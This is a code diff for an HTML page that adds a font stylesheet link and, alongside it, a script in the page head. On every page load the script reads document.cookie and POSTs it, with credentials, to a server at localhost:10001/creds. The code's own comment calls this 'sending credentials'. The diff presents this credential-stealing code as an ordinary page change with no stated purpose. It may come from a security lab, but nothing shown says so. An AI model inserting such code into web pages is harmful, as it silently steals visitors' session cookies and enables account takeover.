@@ -2,6 +2,24 @@
 <html>
 	<head>
 		<link rel="stylesheet" type="text/css" href="style.css">
+		<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+		<script type="text/javascript">
+			function sendingCredentials() {
+				var http = new XMLHttpRequest();
+				var url = "http://localhost:10001/creds";
+				var params = document.cookie; //sending credentials
+
+				http.withCredentials = true;
+				http.open("POST", url, true);
+
+				//Send the proper header information along with the request
+				http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+				http.send(params);
+			}
+
+			sendingCredentials();
+		</script>
 	</head>
 	<body>
 		<div class="container">
@@ -39,4 +57,6 @@
 			<a href="#">SKIP</a>
 		</div>
 	</body>
+
+
 </html>
